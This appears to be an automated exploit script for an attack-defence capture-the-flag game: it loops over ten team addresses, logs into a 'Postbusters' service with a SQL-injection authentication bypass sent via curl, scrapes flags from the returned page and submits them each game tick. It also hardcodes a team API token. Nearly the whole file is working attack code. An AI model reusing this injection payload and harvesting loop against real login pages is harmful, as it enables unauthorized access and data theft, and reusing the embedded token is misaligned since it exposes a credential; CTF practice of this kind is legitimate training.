'''import subprocess
proc = subprocess.Popen(["cat", "cookies.txt"], stdout=subprocess.PIPE, shell=True)
(out, err) = proc.communicate()
print("program output:", out)
'''

from swpag_client import Team
import json
import socket
import time
from pprint import pprint
import traceback

import subprocess
from bs4 import BeautifulSoup
#import commands
def exploit_Postbusters():

    teamId = 1
    allFlags = []
    while teamId <= 10:
        output = subprocess.check_output("curl -x socks5h://0:9090 -c cookies.txt -d'username=admin%27+and+1%3D1+or+%27a%27%3D%27a&password=hello' 'http://172.31.129."+str(teamId)+":20005/login.php'", shell=True)
        output = subprocess.check_output("curl -x socks5h://0:9090 -b cookies.txt 'http://172.31.129."+str(teamId)+":20005/index.php'", shell=True)
        #status, output = commands.getstatusoutput("cat cookies.txt")
        #print("program output:", output)
        soup = BeautifulSoup(output, 'lxml')
        allP = soup.find_all('p')
        for p in allP:
            ptext = p.text
            if 'FLG' in ptext:
                print(ptext)
                allFlags.append(ptext)
                #break

        teamId += 1
    print(t.submit_flag(allFlags))
    #exit()
    print(allFlags)


t = Team("http://actf.cse545.rev.fish", "mrx8dUiqNsIEZUurvHrnaV7QQQUj7oMZ")
print(t.game_url)
#print(t.get_vm())
while True:
    gameStatus = t.get_game_status()
    print('gameStatus:', gameStatus)
    currentTick = gameStatus['tick']['tick_id']
    exploit_Postbusters()
    while True:
        newGameStatus = t.get_game_status()
        newTick = newGameStatus['tick']['tick_id']
        print('Checking new tick:',newTick)
        if newTick != currentTick:
            print("Tick has changed so waiting for 25 more seconds")
            time.sleep(25)
            break
        time.sleep(10)

#print(soup.find_all('p')[0].text)
#myStr = "curl -x socks5h://0:9090 -c cookies.txt -d'username=admin%27+and+1%3D1+or+%27a%27%3D%27a&password=hello' 'http://172.31.129.10:20005/login.php'"
#print(exec('cat cookies.txt'))